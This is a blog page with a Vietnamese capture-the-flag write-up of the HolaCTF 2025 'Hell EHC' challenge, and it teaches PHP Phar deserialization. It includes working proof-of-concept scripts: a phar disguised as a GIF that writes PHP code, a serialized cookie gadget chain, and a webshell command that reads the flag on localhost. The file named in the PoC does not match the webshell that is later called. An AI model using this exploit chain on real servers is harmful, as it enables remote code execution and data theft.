@@ -1,0 +1,226 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Writeup: HolaCTF 2025 | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Web | Hell EHCIntroduction Đây là một challenge liên quan đến lỗ hổng Deserialization và Wrapper phar:&#x2F;&#x2F; trong PHP. (PHP Phar deserialization) Link tải challenge: hell-ehc Các chạy challenge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup: HolaCTF 2025">
+<meta property="og:url" content="https://elliotbigfan.github.io/2025/10/02/2025/ctf/holactf/writeup/index.html">
+<meta property="og:site_name" content="H00d1eBl4ck">
+<meta property="og:description" content="Web | Hell EHCIntroduction Đây là một challenge liên quan đến lỗ hổng Deserialization và Wrapper phar:&#x2F;&#x2F; trong PHP. (PHP Phar deserialization) Link tải challenge: hell-ehc Các chạy challenge">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/holactf/poster.jpg">
+<meta property="article:published_time" content="2025-10-02T07:18:22.000Z">
+<meta property="article:modified_time" content="2025-10-02T09:57:26.330Z">
+<meta property="article:author" content="H00d1eBl4ck">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/holactf/poster.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Writeup: HolaCTF 2025",
+  "url": "https://elliotbigfan.github.io/2025/10/02/2025/ctf/holactf/writeup/",
+  "image": "https://elliotbigfan.github.io/img/ctf/holactf/poster.jpg",
+  "datePublished": "2025-10-02T07:18:22.000Z",
+  "dateModified": "2025-10-02T09:57:26.330Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "H00d1eBl4ck",
+      "url": "https://elliotbigfan.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2025/10/02/2025/ctf/holactf/writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Writeup: HolaCTF 2025',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/holactf/poster.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">Writeup: HolaCTF 2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Writeup: HolaCTF 2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-10-02T07:18:22.000Z" title="Created 2025-10-02 14:18:22">2025-10-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-02T09:57:26.330Z" title="Updated 2025-10-02 16:57:26">2025-10-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/CyberconDTU-2025/">CyberconDTU 2025</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>6mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web-Hell-EHC"><a href="#Web-Hell-EHC" class="headerlink" title="Web | Hell EHC"></a>Web | Hell EHC</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><ul>
+<li>Đây là một challenge liên quan đến lỗ hổng <strong>Deserialization</strong> và Wrapper <strong>phar:&#x2F;&#x2F;</strong> trong PHP. (PHP Phar deserialization)</li>
+<li>Link tải challenge: <a href="/challenge/holactf/hell_ehc.zip">hell-ehc</a></li>
+<li>Các chạy challenge:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. build image</span></span><br><span class="line">docker build -t hell_ehc .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Run container</span></span><br><span class="line">docker run -it --<span class="built_in">rm</span> -p 5005:80 hell_ehc</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="1-Xac-dinh-vi-tri-xay-ra-loi-bao-mat-trong-ma-nguon"><a href="#1-Xac-dinh-vi-tri-xay-ra-loi-bao-mat-trong-ma-nguon" class="headerlink" title="1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn"></a>1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn</h3><ul>
+<li>Vì challenge có cho tính năng upload file nên ta sẽ thử kiểm tra liệu có thể tận dụng điều này để khai thác hay không? </li>
+<li>Ở file <code>upload.php</code>, có 2 dòng code là:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fileExt</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileExt</span>, <span class="variable">$allowedExtensions</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file type is not allowed.&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>2 dòng code trên sẽ đảm bảo ta chỉ được phép upload file có đuôi file cuối cùng thuộc <code>$allowedExtensions</code>, vậy nên ta không thể upload webshell có đuôi file <code>.php</code> để rce được. Thế nên ta sẽ nghĩ theo hướng khác.</p>
+</li>
+<li><p>Ở cả 3 file <code>home.php</code>, <code>upload.php</code>, <code>view_avartars.php</code> đều <code>unserialize</code> trực tiếp <em>cookie</em> của user.</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]), [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; [<span class="string">&#x27;User&#x27;</span>, <span class="string">&#x27;LogFile&#x27;</span>]]);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Vậy ta đã xác định được nơi để truyền untrusted data vào là trường <em>cookie</em>.</li>
+</ul>
+<h3 id="2-Tim-cac-gadgets-co-san-trong-ma-nguon-de-tao-thanh-exploit-chain-RCE"><a href="#2-Tim-cac-gadgets-co-san-trong-ma-nguon-de-tao-thanh-exploit-chain-RCE" class="headerlink" title="2. Tìm các gadgets có sẵn trong mã nguồn để tạo thành exploit chain RCE"></a>2. Tìm các gadgets có sẵn trong mã nguồn để tạo thành exploit chain RCE</h3><ul>
+<li><p>Ở cả 2 file <code>upload.php</code> và <code>view_avatars.php</code>, đểu <code>require</code> đến file là <code>LogAndCheck.php</code>, nhìn qua file này, ta có thể thấy được có 2 class giúp ta RCE là <code>LogFile</code> và <code>Logger</code>.</p>
+<ul>
+<li>Với hàm <code>fwrite</code> ở class <code>Logger</code>, ta có thể nghĩ đến việc tận dụng gadget này để ghi webshell và rce. Tuy nhiên, dòng code để unserialize cookie <code>unserialize(base64_decode($_COOKIE[&#39;user&#39;]), [&#39;allowed_classes&#39; =&gt; [&#39;User&#39;, &#39;LogFile&#39;]])</code> chỉ cho phép chuỗi <code>serialize</code> chứa 2 class là <code>User</code> và <code>Logfile</code>, vậy nên ta sẽ không thể tận dụng trực tiếp class <code>LogFile</code> nữa mà sẽ phải trigger class này thông qua hàm <code>md5_file</code> ở class <code>Logger</code>. </li>
+<li>Về cơ bản, <code>md5_file($path)</code>, nó mở file (qua PHP stream wrapper nếu có, ví dụ <code>phar://</code>, <code>http://</code>, <code>file://</code>), đọc nội dung file và trả về MD5 hash của nội dung đó (kiểu string 32 ký tự hex). ví dụ:</li>
+</ul>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="string">&#x27;/path/to/file.txt&#x27;</span>); <span class="comment">// =&gt; &quot;098f6bcd4621d373cade4e832627b4f6&quot;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$hash</span> === <span class="literal">false</span>) &#123; <span class="comment">/* xử lý lỗi */</span> &#125;</span><br></pre></td></tr></table></figure>
+<p>  Với <code>phar://</code> có tác dụng phụ quan trọng: khi PHP mở phar để truy xuất file trong archive, nó sẽ đọc metadata của phar và <strong>unserialize</strong> nó — điều này có thể kích hoạt <code>__wakeup()</code>, <code>__destruct()</code> hoặc các phương thức khác của object trong metadata.</p>
+<p>  <em>Note: Nếu metadata chứa object mà class đó chưa được định nghĩa, PHP sẽ tạo __PHP_Incomplete_Class và các magic không chạy như mong đợi. Trên PHP 8+, phar.require_hash &#x3D; On có thể ngăn metadata được unserialize nếu archive không có signature hợp lệ.</em></p>
+</li>
+</ul>
+<h3 id="3-Poc-Proof-of-Concept"><a href="#3-Poc-Proof-of-Concept" class="headerlink" title="3. Poc (Proof of Concept)"></a>3. Poc (Proof of Concept)</h3><ul>
+<li>Đầu tiên cần 1 file để tạo <code>payload.phar</code> (chứa class Logger). Đặt tên <code>make_phar.php</code></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$request_log</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;logs , <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$request_log</span>, <span class="variable">$this</span>-&gt;request);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$request_log</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$request_log</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;payload.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;payload.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;\xff\xd8\xff\n&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// thêm file dummy</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;text&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// nhúng object độc hại vào metadata</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line"><span class="variable">$object</span>-&gt;logs = <span class="string">&quot;info.php&quot;</span>;</span><br><span class="line"><span class="variable">$object</span>-&gt;request = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;payload.phar created!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Chạy file <code>make_phar.php</code> với lệnh:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.readonly=0 -d phar.require_hash=0 make_phar.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>không upload <code>payload.phar</code> vì server chỉ chấp nhận <code>.jpg</code>, <code>.gif</code>, <code>.png</code>, <code>.jpeg</code> mà ta sẽ đổi file thành <code>payload.gif</code> vì <code>phar://</code> nhận diện file phar thông qua nội dung bên trong file nên để <code>payload.gif</code> vẫn sẽ được <code>phar://</code> coi là một file phar.</p>
+</li>
+<li><p>Upload <code>payload.gif</code> vừa tạo ra lên server.</p>
+</li>
+<li><p>Kế tiếp, ta cần tạo một chuỗi serialize được encode bằng base64 tạo thành gadget chain trigger được hàm <code>md5_file</code> tại <code>phar://upload/&lt;username&gt;/payload.gif</code></p>
+</li>
+<li><p>Ta sẽ tạo 1 file đặt tên <code>gen_serial.php</code>, chạy lệnh: <code>php gen_serial.php</code> và copy đoạn base64 vừa được tạo ra để đưa vào cookie.</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$description</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="string">&quot;thuan&quot;</span>; <span class="comment">// Sửa tên &quot;thuan&quot; thành tên mà bạn đã đăng nhập</span></span><br><span class="line"><span class="variable">$user</span>-&gt;phone = <span class="keyword">new</span> <span class="title class_">LogFile</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;phone-&gt;filename = <span class="string">&quot;phar://upload/thuan/payload.gif/test.txt&quot;</span>; <span class="comment">// Sửa tên &quot;thuan&quot; thành tên mà bạn đã đăng nhập</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// chuỗi serialize</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)); <span class="comment">// encode base64 serialize </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Kế tiếp truy cập <a target="_blank" rel="noopener" href="http://localhost:5005/?page=view_avatars">http://localhost:5005/?page=view_avatars</a> để trigger được magic method <code>destruct</code> của class <code>LogFile</code>(truy cập file <code>view_avatars.php</code> hoặc <code>upload.php</code> vì 2 file này require <code>LogAndCheck.php</code> nơi chứa class <code>Logger</code>(sink)).</p>
+</li>
+<li><p>Sau đó truy cập: <a target="_blank" rel="noopener" href="http://localhost:5005/s.php?0=cat%20/*.txt">http://localhost:5005/s.php?0=cat%20/*.txt</a> thực thi webshell vừa up để lấy flag.</p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2025/10/02/2025/ctf/holactf/writeup/">https://elliotbigfan.github.io/2025/10/02/2025/ctf/holactf/writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/holactf/poster.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/09/27/Experiences/XSS/xss/" title="Experience: Cross Side Script (XSS)"><img class="cover" src="/img/experience/xss.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Experience: Cross Side Script (XSS)</div></div><div class="info-2"><div class="info-item-1">Description: Mình sẽ note một số kinh nghiệm mà mình lụm nhặt được khi gặp 1 số vấn đề về XSS ở đây :&gt;  Vấn đề 1: Vì sao &lt;img src=x onerror=alert(1)&gt; thường thành công còn &lt;script&gt;…&lt;/script&gt; hay &lt;iframe src=x onload=alert(1)&gt; thường thất bại khi đưa HTML vào $(...) ?   Lab thực hành: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event  Tóm tắt ngắnKhi đưa một chuỗi HTML vào $(...) hoặc innerHTML trong các lab DOM...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025"><img class="cover" src="/img/ctf/cybercon/poster_cybercon.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-25</div><div class="info-item-2">Writeup: cyberconDTU 2025</div></div><div class="info-2"><div class="info-item-1">Web | Safe upload file1. Phân tích mã nguồn và ý tưởng Đọc qua file .yar (validate file upload), ta có thể thấy các file khi đc upload lên server sẽ được file .yar này validate rất chặt và gần như không thể bypass để upload webshell được. Tuy nhiên, khi phân tích file upload.php ta có thể thấy một số đoạn code xử lý không hợp lý và dẫn đến upload file race condition.  1234567891011// move file vào thư mục $tmp_path(/var/www/html/tmp) if (!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Hell-EHC"><span class="toc-number">1.</span> <span class="toc-text">Web | Hell EHC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a 